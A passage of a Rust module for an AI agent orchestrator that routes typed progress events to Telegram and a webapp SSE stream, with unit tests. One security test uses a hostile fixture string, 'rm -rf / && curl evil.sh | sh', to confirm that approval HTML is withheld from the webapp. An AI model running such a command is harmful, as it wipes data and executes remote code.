//! Typed progress events + fan-out router (Slice 1 of the webapp transport/UX project).
//!
//! Historically the orchestrator emitted raw `(chat_id, String)` progress
//! messages over an `mpsc` channel that only Telegram consumed
//! (`spawn_progress_listener`), which decoded meaning back out of emoji
//! prefixes. This module replaces the wire type with a *typed*
//! [`ProgressEvent`] while preserving Telegram's behavior **byte-for-byte** via
//! the pure [`progress_event_to_legacy_string`] decoder.
//!
//! The [`ProgressRouter`] fans each event to:
//!   (a) the legacy Telegram sink — `try_send((chat_id, decoded_string))`, and
//!   (b) an optional per-turn webapp sink registered by `turn_id` (used by
//!       later slices for SSE streaming; register/unregister are real now but
//!       no producer registers a turn yet).
//!
//! No orchestrator logic changes hang off this module: every send site simply
//! constructs a typed variant instead of formatting a string, and the decoder
//! reproduces the exact prior string.

use std::collections::HashMap;
use std::future::Future;
use std::sync::Arc;

use parking_lot::Mutex;
use tokio::sync::mpsc::Sender;

/// Durable conversation anchor for one owner Web chat request. Existing L1
/// snapshots and L3 archives already preserve both anchor fields.
pub const WEBAPP_TURN_ANCHOR_KIND: &str = "webapp_turn";

tokio::task_local! {
    /// The webapp turn id (`idempotency_key`) for the currently-executing turn,
    /// if any. Set by [`with_turn_id`] around the webapp general-chat
    /// orchestrator call so that every `ProgressEvent` constructed deep inside
    /// the react loop (12+ send sites, reached through many layers) is stamped
    /// with the turn id **without** threading an `Option<String>` parameter
    /// through `process_message_multimodal_inner` and every helper method.
    ///
    /// The task-local propagates across `.await` points within the same task.
    /// The webapp turn runs inline within one tokio task (the bg task spawned in
    /// `webapp_vnext_command`), so all progress send sites observe it. Telegram,
    /// heartbeat, focused, and every other caller never enter a [`with_turn_id`]
    /// scope, so `current_turn_id()` returns `None` and their events keep
    /// `turn_id = None` — byte-identical Telegram behavior is preserved.
    static CURRENT_TURN_ID: Option<String>;
}

/// Read the current turn id from the task-local, returning `None` outside any
/// [`with_turn_id`] scope (Telegram / heartbeat / focused / tests).
pub fn current_turn_id() -> Option<String> {
    CURRENT_TURN_ID
        .try_with(|turn_id| turn_id.clone())
        .ok()
        .flatten()
}

tokio::task_local! {
    /// Set only around the owner-visible ReAct model call. Other completions
    /// on the same task (refusal audit, summarizer, subcalls) stay blocking.
    static OWNER_REPLY_STREAM: ();
}

/// True inside [`with_owner_reply_stream`]. Combined with [`current_turn_id`],
/// this is the gate for token streaming.
pub fn owner_reply_stream_enabled() -> bool {
    OWNER_REPLY_STREAM.try_with(|_| ()).is_ok()
}

/// Run `fut` as the owner-visible model call that may stream assistant text.
pub async fn with_owner_reply_stream<F>(fut: F) -> F::Output
where
    F: Future,
{
    OWNER_REPLY_STREAM.scope((), fut).await
}

/// Run `fut` with the current turn id bound to `turn_id` for the duration of the
/// future. Every [`ProgressEvent::new`] constructed while `fut` executes (on
/// this task, across `.await`) inherits `turn_id`, so webapp turns fan their
/// events out to the registered per-turn SSE sink while all other callers stay
/// `turn_id = None`.
pub async fn with_turn_id<F>(turn_id: Option<String>, fut: F) -> F::Output
where
    F: Future,
{
    CURRENT_TURN_ID.scope(turn_id, fut).await
}

/// A single progress event flowing from the orchestrator toward the owner.
#[derive(Debug, Clone)]
pub struct ProgressEvent {
    /// The chat the event is destined for (Telegram chat id / admin chat id).
    pub chat_id: i64,
    /// The turn this event belongs to (the webapp `idempotency_key`). `None`
    /// for events produced outside a tracked webapp turn (e.g. heartbeat
    /// notifications, or — for now — all events, until later slices thread a
    /// real turn id through the react loop).
    pub turn_id: Option<String>,
    /// The typed payload. Boxed so `ProgressEvent` stays small — this keeps the
    /// channel's `TrySendError<ProgressEvent>` / `SendError<ProgressEvent>`
    /// error variants under clippy's `result_large_err` threshold (the payload
    /// enum carries several `String`s, e.g. the full approval HTML).
    pub payload: Box<ProgressPayload>,
}

impl ProgressEvent {
    /// Convenience constructor. The `turn_id` is taken from the ambient
    /// [`with_turn_id`] task-local scope (the webapp turn's `idempotency_key`),
    /// or `None` outside any such scope (Telegram / heartbeat / focused). This
    /// lets the 12+ orchestrator send sites stamp the turn id without threading
    /// a parameter through the entire react-loop call tree.
    pub fn new(chat_id: i64, payload: ProgressPayload) -> Self {
        Self {
            chat_id,
            turn_id: current_turn_id(),
            payload: Box::new(payload),
        }
    }

    /// Construct an event with an explicit `turn_id`, bypassing the task-local.
    /// Used by tests that need a deterministic turn id without entering a
    /// [`with_turn_id`] scope.
    pub fn with_turn(chat_id: i64, turn_id: Option<String>, payload: ProgressPayload) -> Self {
        Self {
            chat_id,
            turn_id,
            payload: Box::new(payload),
        }
    }
}

/// Classification of an owner-facing notice. Telegram only cares about the
/// decoded *string* (its `owner_progress_kind` re-derives a class from the
/// emoji prefix), so this enum exists purely to give the webapp a typed hint
/// without re-parsing text. The decoded string is what guarantees Telegram
/// byte-identity, so each notice carries its fully-formatted `text`.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum OwnerNoticeKind {
    /// `notify_user`-style proactive notice (robot/clipboard/mail prefixes).
    NotifyUser,
    /// Assistant-event proactive notification (`emit_proactive_notification`).
    AssistantEvent,
    /// Health-probe state-change notice (`[Health] …`).
    Health,
    /// Model-fallback / vision-fallback advisory (⚠️ …).
    ModelFallback,
    /// A miscellaneous system/owner advisory whose text is already fully
    /// formatted by the call site (timezone fallback, daily summary, panel
    /// confirmations, knowledge progress lines, HITL ack, …). The
    /// kind is advisory only; the decoded string is authoritative for Telegram.
    System,
}

/// The typed payload of a [`ProgressEvent`]. Every existing orchestrator send
/// site maps onto exactly one of these variants — the send-site → variant map is
/// in the commit Change Brief and the round-trip tests below (each cites its old
/// call site); the slice plan lives in `docs/2026-06-09-webapp-transport-ux-design.md`.
#[derive(Debug, Clone)]
pub enum ProgressPayload {
    /// A tool is about to execute. Legacy string: `"⚙️ Using {tool_name} …"`.
    ToolStart { tool_name: String },
    /// A tool finished. **No current orchestrator site emits this** (Telegram
    /// never showed a tool-done line); defined for later webapp slices.
    ToolDone { tool_name: String },
    /// Multimodal content was routed to a vision model.
    /// Legacy string: `"🖼️ 多模态内容已转由 {model} 处理 · Multimodal content routed to {model}"`.
    VisionRouted { model: String },
    /// The primary model was unavailable and the request switched to a
    /// fallback model. Legacy string:
    /// `"⚠️ 主模型 {from} 不可用，已切换至备用模型 {to}"`.
    FallbackRouted { from: String, to: String },
    /// A tool requires human approval (HITL). `approval_html` is the fully
    /// pre-built Telegram message and is what the decoder returns verbatim so
    /// the Telegram approval path is byte-identical. The other fields are
    /// structured data for the webapp approval card (Slice 4).
    NeedApproval {
        approval_id: Option<String>,
        tool_name: Option<String>,
        summary: Option<String>,
        approval_html: String,
    },
    /// An owner-facing notice whose `text` is already fully formatted by the
    /// call site. The decoder returns `text` verbatim (byte-identical), and
    /// `kind` is an advisory typed hint for the webapp.
    OwnerNotice { text: String, kind: OwnerNoticeKind },
    /// CEO Intent Contract: one-word / short utterance resolved before tools run.
    /// WebApp-only (SSE `intent_resolved`). Telegram legacy string is a short
    /// status line so proactive surfaces stay quiet.
    IntentResolved {
        intent_id: String,
        label: String,
        confidence: f32,
        needs_review: bool,
    },
    /// The final assistant reply for a turn. **No current orchestrator site
    /// emits this** over the progress channel (Telegram delivers final replies
    /// via a separate path); defined for later webapp slices.
    FinalReply { text: String },
    /// Incremental owner-visible assistant text for the in-flight Web turn.
    /// WebApp-only: Telegram must not receive one message per token. The
    /// persisted L1 row is still the completed reply, not these fragments.
    AssistantDelta { text: String },
    /// Drop the provisional assistant text. Sent when a round's streamed
    /// words will not be the stored answer (tool round, discarded retry,
    /// or a stream that failed before completion).
    AssistantDraftReset,
    /// Mid-flight owner-visible phase (Grok Build / Codex / Jev / executing).
    /// WebApp SSE `action_phase`. Telegram legacy is a short status line.
    ActionPhase {
        phase: String,
        tool_name: Option<String>,
        detail: Option<String>,
    },
}

/// Convert a [`ProgressEvent`] to the legacy `(chat_id, String)` wire form's
/// string component. This is the **byte-identity guarantee**: for every variant
/// that a current orchestrator site emits, the returned string is exactly what
/// the old code passed to `tx.try_send((chat_id, …))`, so Telegram rendering
/// and `owner_progress_kind` classification are unchanged.
///
/// Pure (no I/O, no allocation beyond the returned string) so it can be unit
/// round-trip tested and called from both the router and the Telegram listener.
pub fn progress_event_to_legacy_string(event: &ProgressEvent) -> String {
    match &*event.payload {
        // Mirrors orchestrator.rs:14473 — `format!("⚙️ Using {} …", tool_name)`.
        ProgressPayload::ToolStart { tool_name } => format!("⚙️ Using {} …", tool_name),
        // No legacy producer; keep a sensible decode for later slices. Not a
        // Telegram-regression risk because nothing emits it today.
        ProgressPayload::ToolDone { tool_name } => format!("✓ {} done", tool_name),
        // Mirrors orchestrator.rs:11788 — vision-routed notice.
        ProgressPayload::VisionRouted { model } => format!(
            "🖼️ 多模态内容已转由 {} 处理 · Multimodal content routed to {}",
            model, model
        ),
        // Mirrors orchestrator.rs:6304 — fallback-routed notice.
        ProgressPayload::FallbackRouted { from, to } => {
            format!("⚠️ 主模型 {} 不可用，已切换至备用模型 {}", from, to)
        }
        // Mirrors orchestrator.rs:13506 / 14028 / 13360 — the full pre-built
        // Telegram approval HTML is returned verbatim.
        ProgressPayload::NeedApproval { approval_html, .. } => approval_html.clone(),
        // OwnerNotice carries the already-formatted text; return verbatim.
        ProgressPayload::OwnerNotice { text, .. } => text.clone(),
        // CEO intent resolve: quiet legacy line (Telegram does not need the card).
        ProgressPayload::IntentResolved { label, .. } => {
            format!("🧭 {label}")
        }
        // No legacy producer over this channel; return text verbatim.
        ProgressPayload::FinalReply { text } => text.clone(),
        // WebApp-only. Empty so a mistaken Telegram forward stays silent.
        ProgressPayload::AssistantDelta { .. } | ProgressPayload::AssistantDraftReset => {
            String::new()
        }
        ProgressPayload::ActionPhase {
            phase,
            tool_name,
            detail,
        } => {
            if let Some(detail) = detail.as_deref().filter(|s| !s.trim().is_empty()) {
                format!("⚙️ {detail}")
            } else if let Some(tool) = tool_name.as_deref().filter(|s| !s.trim().is_empty()) {
                format!("⚙️ {phase} {tool}")
            } else {
                format!("⚙️ {phase}")
            }
        }
    }
}

/// Maximum length of the approval `summary` excerpt forwarded over SSE. The
/// full `approval_html` (which may embed shell commands / sensitive payloads)
/// is **never** sent to the webapp — only this bounded excerpt.
pub const SSE_APPROVAL_SUMMARY_MAX: usize = 500;

/// The SSE frame produced for a [`ProgressEvent`]: the EventSource event `name`
/// (so the client can `addEventListener(name, …)`) plus the JSON `data`.
#[derive(Debug, Clone)]
pub struct SseFrame {
    /// The frame type — also the SSE `event:` name. One of:
    /// `tool_start | tool_done | vision_routed | need_approval | owner_notice |
    /// intent_resolved | action_phase | assistant_delta | assistant_draft_reset |
    /// done | error`.
    pub event_type: &'static str,
    /// The JSON object `{ "type", "turn_id", … }` for the `data:` line.
    pub data: serde_json::Value,
}

/// Truncate a `&str` to at most `max` characters (not bytes), appending an
/// ellipsis when truncated. Char-boundary safe.
fn truncate_summary(text: &str, max: usize) -> String {
    if text.chars().count() <= max {
        text.to_string()
    } else {
        let truncated: String = text.chars().take(max).collect();
        format!("{truncated}…")
    }
}

/// Serialize a [`ProgressEvent`] into a typed SSE [`SseFrame`] for the webapp
/// per-turn stream (design §SSE schema). Every frame carries `{type, turn_id,
/// …}`.
///
/// **Security:** the `need_approval` frame deliberately carries ONLY the
/// bounded `summary` excerpt (≤ [`SSE_APPROVAL_SUMMARY_MAX`] chars) plus
/// `approval_id` and `tool_name`. The full `approval_html` (which may embed
/// shell commands) is **never** forwarded to the webapp — it stays
/// Telegram-only.
pub fn progress_event_to_sse_json(event: &ProgressEvent) -> SseFrame {
    let turn_id = event.turn_id.clone();
    let (event_type, mut data) = match &*event.payload {
        ProgressPayload::ToolStart { tool_name } => {
            ("tool_start", serde_json::json!({ "tool_name": tool_name }))
        }
        ProgressPayload::ToolDone { tool_name } => {
            ("tool_done", serde_json::json!({ "tool_name": tool_name }))
        }
        ProgressPayload::VisionRouted { model } => {
            ("vision_routed", serde_json::json!({ "model": model }))
        }
        // No dedicated SSE frame type for fallback routing; surface it as an
        // owner_notice carrying the decoded owner-facing text.
        ProgressPayload::FallbackRouted { from, to } => (
            "owner_notice",
            serde_json::json!({
                "text": format!("⚠️ 主模型 {from} 不可用，已切换至备用模型 {to}"),
                "kind": "model_fallback",
            }),
        ),
        // SECURITY: excerpt only — never `approval_html`.
        ProgressPayload::NeedApproval {
            approval_id,
            tool_name,
            summary,
            approval_html: _,
        } => (
            "need_approval",
            serde_json::json!({
                "approval_id": approval_id,
                "tool_name": tool_name,
                "summary": summary
                    .as_deref()
                    .map(|s| truncate_summary(s, SSE_APPROVAL_SUMMARY_MAX)),
            }),
        ),
        ProgressPayload::OwnerNotice { text, kind } => (
            "owner_notice",
            serde_json::json!({
                "text": text,
                "kind": owner_notice_kind_str(*kind),
            }),
        ),
        ProgressPayload::IntentResolved {
            intent_id,
            label,
            confidence,
            needs_review,
        } => (
            "intent_resolved",
            serde_json::json!({
                "intent_id": intent_id,
                "label": label,
                "confidence": confidence,
                "needs_review": needs_review,
            }),
        ),
        // The final reply ends the turn: emit a `done` frame carrying the text.
        ProgressPayload::FinalReply { text } => ("done", serde_json::json!({ "text": text })),
        ProgressPayload::AssistantDelta { text } => {
            ("assistant_delta", serde_json::json!({ "text": text }))
        }
        ProgressPayload::AssistantDraftReset => ("assistant_draft_reset", serde_json::json!({})),
        ProgressPayload::ActionPhase {
            phase,
            tool_name,
            detail,
        } => (
            "action_phase",
            serde_json::json!({
                "phase": phase,
                "tool_name": tool_name,
                "detail": detail,
            }),
        ),
    };
    if let serde_json::Value::Object(map) = &mut data {
        map.insert("type".to_string(), serde_json::json!(event_type));
        map.insert("turn_id".to_string(), serde_json::json!(turn_id));
    }
    SseFrame { event_type, data }
}

/// Stable string tag for an [`OwnerNoticeKind`] (for the SSE `owner_notice`
/// frame's `kind` field).
fn owner_notice_kind_str(kind: OwnerNoticeKind) -> &'static str {
    match kind {
        OwnerNoticeKind::NotifyUser => "notify_user",
        OwnerNoticeKind::AssistantEvent => "assistant_event",
        OwnerNoticeKind::Health => "health",
        OwnerNoticeKind::ModelFallback => "model_fallback",
        OwnerNoticeKind::System => "system",
    }
}

/// Fan-out router: decodes each event to the legacy Telegram string and (for
/// registered turns) also forwards the typed event to a per-turn webapp sink.
///
/// Cloneable + `Send`/`Sync` so it can live in `AdminState` and be shared with
/// the orchestrator (later slices). This slice only uses
/// [`ProgressRouter::progress_sender`] to feed the orchestrator.
#[derive(Clone)]
pub struct ProgressRouter {
    inner: Arc<RouterInner>,
}

struct RouterInner {
    /// The legacy Telegram sink (`spawn_progress_listener` drains it — though
    /// after this slice that listener consumes `ProgressEvent`, so in practice
    /// `main.rs` wires the typed channel here; see `LegacySink`).
    telegram: TelegramSink,
    /// Per-turn webapp sinks keyed by `turn_id`. parking_lot mutex; the lock is
    /// always dropped before any `try_send` (no awaiting under the lock).
    /// `Pending` holds assistant text that arrived before the EventSource
    /// registered, so the first tokens are not dropped on the mint race.
    turns: Mutex<HashMap<String, TurnFanout>>,
}

enum TurnFanout {
    Live(Sender<ProgressEvent>),
    /// Assistant text buffered until [`ProgressRouter::register_turn`].
    Pending(String),
}

const PENDING_TURN_CAP: usize = 32;

/// The Telegram-bound sink. In production this is the typed event channel that
/// `spawn_progress_listener` now consumes; the router forwards the *whole
/// event* and the listener decodes it via [`progress_event_to_legacy_string`].
type TelegramSink = Sender<ProgressEvent>;

impl ProgressRouter {
    /// Build a router over the Telegram event channel.
    pub fn new(telegram: Sender<ProgressEvent>) -> Self {
        Self {
            inner: Arc::new(RouterInner {
                telegram,
                turns: Mutex::new(HashMap::new()),
            }),
        }
    }

    /// Register a per-turn webapp sink. Later slices (SSE endpoint) call this
    /// before the turn's background task starts; the returned events are typed.
    pub fn register_turn(&self, turn_id: String, sink: Sender<ProgressEvent>) {
        let mut turns = self.inner.turns.lock();
        let pending = match turns.remove(&turn_id) {
            Some(TurnFanout::Pending(text)) => text,
            Some(TurnFanout::Live(_)) | None => String::new(),
        };
        turns.insert(turn_id.clone(), TurnFanout::Live(sink.clone()));
        if !pending.is_empty() {
            let _ = sink.try_send(ProgressEvent::with_turn(
                0,
                Some(turn_id),
                ProgressPayload::AssistantDelta { text: pending },
            ));
        }
    }

    /// Unregister a per-turn webapp sink (on EventSource drop / turn end).
    pub fn unregister_turn(&self, turn_id: &str) {
        self.inner.turns.lock().remove(turn_id);
    }

    /// A progress sender to hand to the orchestrator. On `try_send(event)` it:
    ///   (a) forwards the event to the Telegram sink (which decodes to the
    ///       legacy string), and
    ///   (b) if the event's `turn_id` is registered, also forwards the typed
    ///       event to that webapp sink (lock dropped before send).
    pub fn progress_sender(&self) -> ProgressRouterSender {
        ProgressRouterSender {
            inner: self.inner.clone(),
        }
    }
}

/// A cloneable sender wrapper that fans out to Telegram + an optional per-turn
/// webapp sink. API-compatible (`try_send`) with the prior raw `mpsc::Sender`
/// so call sites only change their *argument* (a `ProgressEvent`), not control
/// flow.
#[derive(Clone)]
pub struct ProgressRouterSender {
    inner: Arc<RouterInner>,
}

impl ProgressRouterSender {
    /// Construct a sender that forwards only to the given channel, with an
    /// empty turn registry. Used by unit tests that wire a bare
    /// `mpsc::channel::<ProgressEvent>` directly to the orchestrator (no
    /// per-turn webapp fan-out needed). Production code goes through
    /// [`ProgressRouter::progress_sender`].
    pub fn direct(telegram: Sender<ProgressEvent>) -> Self {
        Self {
            inner: Arc::new(RouterInner {
                telegram,
                turns: Mutex::new(HashMap::new()),
            }),
        }
    }

    /// Fan the event out. Returns the Telegram-sink `try_send` result so call
    /// sites that log/handle send failure keep working unchanged. The webapp
    /// forward is best-effort/advisory (drops are fine) and does not affect the
    /// returned result.
    pub fn try_send(
        &self,
        event: ProgressEvent,
    ) -> Result<(), tokio::sync::mpsc::error::TrySendError<ProgressEvent>> {
        // (b) Optionally forward the typed event to a registered webapp turn.
        // Clone the sink out under the lock, then drop the lock before sending.
        // Advisory: drops are acceptable (bounded channel, SSE may lag). Log at
        // DEBUG so a lagging webapp client is observable without spamming the
        // owner-facing path.
        if webapp_only_payload(&event.payload) {
            self.dispatch_webapp_only(event);
            return Ok(());
        }
        if let Some(turn_id) = event.turn_id.as_deref() {
            // Clone the sink out under the lock, then drop the lock before sending.
            let webapp_sink = self.live_sink(turn_id);
            if let Some(sink) = webapp_sink
                && let Err(err) = sink.try_send(event.clone())
            {
                tracing::debug!(
                    turn_id,
                    reason = %err,
                    "[ProgressRouter] dropped webapp SSE event (sink full/closed)"
                );
            }
        }
        // (a) Telegram sink is authoritative for the returned result.
        self.inner.telegram.try_send(event)
    }

    /// Async send to the Telegram sink (used by the urgent-notification path
    /// which awaits delivery with a timeout). Webapp turn forwarding still
    /// happens best-effort first.
    pub async fn send(
        &self,
        event: ProgressEvent,
    ) -> Result<(), tokio::sync::mpsc::error::SendError<ProgressEvent>> {
        if webapp_only_payload(&event.payload) {
            self.dispatch_webapp_only(event);
            return Ok(());
        }
        if let Some(turn_id) = event.turn_id.as_deref() {
            let webapp_sink = self.live_sink(turn_id);
            if let Some(sink) = webapp_sink
                && let Err(err) = sink.try_send(event.clone())
            {
                tracing::debug!(
                    turn_id,
                    reason = %err,
                    "[ProgressRouter] dropped webapp SSE event (sink full/closed)"
                );
            }
        }
        self.inner.telegram.send(event).await
    }
}

fn webapp_only_payload(payload: &ProgressPayload) -> bool {
    matches!(
        payload,
        ProgressPayload::AssistantDelta { .. } | ProgressPayload::AssistantDraftReset
    )
}

impl ProgressRouterSender {
    fn live_sink(&self, turn_id: &str) -> Option<Sender<ProgressEvent>> {
        match self.inner.turns.lock().get(turn_id) {
            Some(TurnFanout::Live(sink)) => Some(sink.clone()),
            Some(TurnFanout::Pending(_)) | None => None,
        }
    }

    /// Assistant-text frames stay on the Web sink. Tokens are buffered until
    /// the EventSource registers so the mint race does not drop the opening.
    fn dispatch_webapp_only(&self, event: ProgressEvent) {
        let Some(turn_id) = event.turn_id.clone() else {
            return;
        };
        let delta = match &*event.payload {
            ProgressPayload::AssistantDelta { text } => Some(text.clone()),
            ProgressPayload::AssistantDraftReset => None,
            _ => return,
        };
        let mut turns = self.inner.turns.lock();
        let live = match turns.get(&turn_id) {
            Some(TurnFanout::Live(sink)) => Some(sink.clone()),
            Some(TurnFanout::Pending(_)) | None => None,
        };
        if let Some(sink) = live {
            drop(turns);
            if let Err(err) = sink.try_send(event) {
                tracing::debug!(
                    turn_id,
                    reason = %err,
                    "[ProgressRouter] dropped webapp assistant delta (sink full/closed)"
                );
            }
            return;
        }
        let Some(text) = delta else {
            if matches!(turns.get(&turn_id), Some(TurnFanout::Pending(_))) {
                turns.remove(&turn_id);
            }
            return;
        };
        if let Some(TurnFanout::Pending(buf)) = turns.get_mut(&turn_id) {
            buf.push_str(&text);
            return;
        }
        if turns.len() >= PENDING_TURN_CAP {
            let evict = turns
                .iter()
                .find(|(_, fanout)| matches!(fanout, TurnFanout::Pending(_)))
                .map(|(id, _)| id.clone());
            if let Some(id) = evict {
                turns.remove(&id);
            }
        }
        turns.insert(turn_id, TurnFanout::Pending(text));
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ev(payload: ProgressPayload) -> ProgressEvent {
        ProgressEvent::new(42, payload)
    }

    // Each assertion below mirrors EXACTLY the string the corresponding old
    // orchestrator call site passed to `tx.try_send((cid, …))`. This is the
    // Telegram byte-preservation guarantee for Slice 1.

    #[test]
    fn tool_start_matches_orch_14473() {
        // OLD: format!("⚙️ Using {} …", tool_name)  (orchestrator.rs:14473)
        let s = progress_event_to_legacy_string(&ev(ProgressPayload::ToolStart {
            tool_name: "web_search".to_string(),
        }));
        assert_eq!(s, "⚙️ Using web_search …");
    }

    #[test]
    fn vision_routed_matches_orch_11788() {
        // OLD: format!("🖼️ 多模态内容已转由 {} 处理 · Multimodal content routed to {}", vm, vm)
        //      (orchestrator.rs:11788)
        let s = progress_event_to_legacy_string(&ev(ProgressPayload::VisionRouted {
            model: "gpt-4o".to_string(),
        }));
        assert_eq!(
            s,
            "🖼️ 多模态内容已转由 gpt-4o 处理 · Multimodal content routed to gpt-4o"
        );
    }

    #[test]
    fn fallback_routed_matches_orch_6304() {
        // OLD: format!("⚠️ 主模型 {} 不可用，已切换至备用模型 {}", effective_primary, fallback)
        //      (orchestrator.rs:6304)
        let s = progress_event_to_legacy_string(&ev(ProgressPayload::FallbackRouted {
            from: "model-a".to_string(),
            to: "model-b".to_string(),
        }));
        assert_eq!(s, "⚠️ 主模型 model-a 不可用，已切换至备用模型 model-b");
    }

    #[test]
    fn need_approval_returns_html_verbatim() {
        // OLD: the fully pre-built `approval_msg` HTML string
        //      (orchestrator.rs:13506 / 14028 / 13360) sent verbatim.
        let html = "🔐 <b>Approval Request</b>\n\n\
                     Tool: <code>send_email</code>\n\
                     subject: hi\n\n\
                     Approval ID: `gate-abc123`"
            .to_string();
        let s = progress_event_to_legacy_string(&ev(ProgressPayload::NeedApproval {
            approval_id: Some("gate-abc123".to_string()),
            tool_name: Some("send_email".to_string()),
            summary: Some("subject: hi".to_string()),
            approval_html: html.clone(),
        }));
        assert_eq!(s, html);
        // Sanity: the decoded string still trips Telegram's approval classifier.
        assert!(s.contains("Approval Request"));
    }

    #[test]
    fn owner_notice_returns_text_verbatim() {
        // OLD owner-notice sites pass an already-formatted string:
        //   - assistant-event: `message` (orchestrator.rs:3941)
        //   - notify_user line: "🤖 [label] msg" (orchestrator.rs:8105 → 8147/8232)
        //   - tool-queued notify: "🤖 [tool] msg" (orchestrator.rs:13072)
        //   - health: "[Health] …" (orchestrator.rs:6525)
        //   - vision/model fallback advisory: "⚠️ …" (orchestrator.rs:6242)
        for (text, kind) in [
            ("🤖 [primary] Security alert", OwnerNoticeKind::NotifyUser),
            (
                "[Health] ⚠️ openrouter 不可用: timeout",
                OwnerNoticeKind::Health,
            ),
            (
                "⚠️ Vision 模型不可用，回退到主模型 gpt-4o (图片识别质量可能下降) · Vision model unavailable, falling back to gpt-4o",
                OwnerNoticeKind::ModelFallback,
            ),
            (
                "plain assistant event body",
                OwnerNoticeKind::AssistantEvent,
            ),
        ] {
            let s = progress_event_to_legacy_string(&ev(ProgressPayload::OwnerNotice {
                text: text.to_string(),
                kind,
            }));
            assert_eq!(s, text);
        }
    }

    #[tokio::test]
    async fn router_fans_to_telegram_sink_decoded() {
        let (tg_tx, mut tg_rx) = tokio::sync::mpsc::channel::<ProgressEvent>(4);
        let router = ProgressRouter::new(tg_tx);
        let sender = router.progress_sender();

        sender
            .try_send(ProgressEvent::new(
                7,
                ProgressPayload::ToolStart {
                    tool_name: "calc".to_string(),
                },
            ))
            .expect("telegram try_send");

        let got = tg_rx.recv().await.expect("event delivered to telegram");
        assert_eq!(got.chat_id, 7);
        assert_eq!(progress_event_to_legacy_string(&got), "⚙️ Using calc …");
    }

    #[tokio::test]
    async fn router_forwards_to_registered_turn() {
        let (tg_tx, mut tg_rx) = tokio::sync::mpsc::channel::<ProgressEvent>(4);
        let (turn_tx, mut turn_rx) = tokio::sync::mpsc::channel::<ProgressEvent>(4);
        let router = ProgressRouter::new(tg_tx);
        router.register_turn("turn-1".to_string(), turn_tx);
        let sender = router.progress_sender();

        let mut event = ProgressEvent::new(
            9,
            ProgressPayload::ToolDone {
                tool_name: "calc".to_string(),
            },
        );
        event.turn_id = Some("turn-1".to_string());
        sender.try_send(event).expect("send");

        // Both sinks see it.
        assert!(tg_rx.recv().await.is_some());
        let webapp = turn_rx.recv().await.expect("webapp sink");
        assert_eq!(webapp.turn_id.as_deref(), Some("turn-1"));

        // After unregister, only Telegram receives.
        router.unregister_turn("turn-1");
        let mut event2 = ProgressEvent::new(
            9,
            ProgressPayload::ToolStart {
                tool_name: "calc".to_string(),
            },
        );
        event2.turn_id = Some("turn-1".to_string());
        sender.try_send(event2).expect("send2");
        assert!(tg_rx.recv().await.is_some());
        assert!(turn_rx.try_recv().is_err());
    }

    /// The Slice-2 fan-out: events constructed *inside* a [`with_turn_id`]
    /// scope (as the orchestrator does for a webapp turn) reach the registered
    /// per-turn webapp sink, AND the Telegram sink still receives the same
    /// event decoded to its legacy string. Telegram fan-out is unaffected.
    #[tokio::test]
    async fn task_local_turn_id_fans_out_to_both_sinks() {
        let (tg_tx, mut tg_rx) = tokio::sync::mpsc::channel::<ProgressEvent>(8);
        let (turn_tx, mut turn_rx) = tokio::sync::mpsc::channel::<ProgressEvent>(8);
        let router = ProgressRouter::new(tg_tx);
        router.register_turn("turn-xyz".to_string(), turn_tx);
        let sender = router.progress_sender();

        // Inside the scope, ProgressEvent::new auto-stamps turn_id="turn-xyz".
        with_turn_id(Some("turn-xyz".to_string()), async {
            assert_eq!(current_turn_id().as_deref(), Some("turn-xyz"));
            let event = ProgressEvent::new(
                100,
                ProgressPayload::ToolStart {
                    tool_name: "web_search".to_string(),
                },
            );
            assert_eq!(event.turn_id.as_deref(), Some("turn-xyz"));
            sender.try_send(event).expect("fan-out send");
        })
        .await;

        // (a) Webapp sink received the typed event.
        let webapp = turn_rx.recv().await.expect("webapp sink event");
        assert_eq!(webapp.turn_id.as_deref(), Some("turn-xyz"));
        let frame = progress_event_to_sse_json(&webapp);
        assert_eq!(frame.event_type, "tool_start");
        assert_eq!(frame.data["tool_name"], "web_search");

        // (b) Telegram sink received the SAME event, decodable to the legacy
        // string — byte-identical Telegram behavior preserved.
        let tg = tg_rx.recv().await.expect("telegram sink event");
        assert_eq!(
            progress_event_to_legacy_string(&tg),
            "⚙️ Using web_search …"
        );
    }

    /// Outside any [`with_turn_id`] scope (Telegram / heartbeat / focused),
    /// events carry `turn_id = None` and never fan out to a webapp turn.
    #[tokio::test]
    async fn no_scope_means_no_turn_id_no_webapp_fanout() {
        assert!(current_turn_id().is_none());
        let (tg_tx, mut tg_rx) = tokio::sync::mpsc::channel::<ProgressEvent>(4);
        let (turn_tx, mut turn_rx) = tokio::sync::mpsc::channel::<ProgressEvent>(4);
        let router = ProgressRouter::new(tg_tx);
        router.register_turn("turn-xyz".to_string(), turn_tx);
        let sender = router.progress_sender();

        let event = ProgressEvent::new(
            7,
            ProgressPayload::ToolStart {
                tool_name: "calc".to_string(),
            },
        );
        assert!(event.turn_id.is_none());
        sender.try_send(event).expect("send");

        assert!(tg_rx.recv().await.is_some());
        // No turn_id ⇒ webapp sink never receives it.
        assert!(turn_rx.try_recv().is_err());
    }

    #[test]
    fn sse_need_approval_excerpt_only_never_html() {
        let secret_html = "🔐 RUN: <code>rm -rf / && curl evil.sh | sh</code>".to_string();
        let long_summary = "x".repeat(900);
        let frame = progress_event_to_sse_json(&ProgressEvent::with_turn(
            5,
            Some("t1".to_string()),
            ProgressPayload::NeedApproval {
                approval_id: Some("gate-1".to_string()),
                tool_name: Some("shell".to_string()),
                summary: Some(long_summary),
                approval_html: secret_html.clone(),
            },
        ));
        assert_eq!(frame.event_type, "need_approval");
        assert_eq!(frame.data["type"], "need_approval");
        assert_eq!(frame.data["turn_id"], "t1");
        assert_eq!(frame.data["approval_id"], "gate-1");
        assert_eq!(frame.data["tool_name"], "shell");
        // Summary is excerpted to the cap (+ ellipsis), and the secret html
        // is NOWHERE in the serialized frame.
        let serialized = serde_json::to_string(&frame.data).unwrap();
        assert!(!serialized.contains("approval_html"));
        assert!(!serialized.contains("rm -rf"));
        assert!(!serialized.contains("evil.sh"));
        let summary = frame.data["summary"].as_str().unwrap();
        assert_eq!(summary.chars().count(), SSE_APPROVAL_SUMMARY_MAX + 1); // +ellipsis
        assert!(summary.ends_with('…'));
    }

    #[test]
    fn sse_frame_types_cover_payloads() {
        let cases: Vec<(ProgressPayload, &str)> = vec![
            (
                ProgressPayload::ToolStart {
                    tool_name: "a".into(),
                },
                "tool_start",
            ),
            (
                ProgressPayload::ToolDone {
                    tool_name: "a".into(),
                },
                "tool_done",
            ),
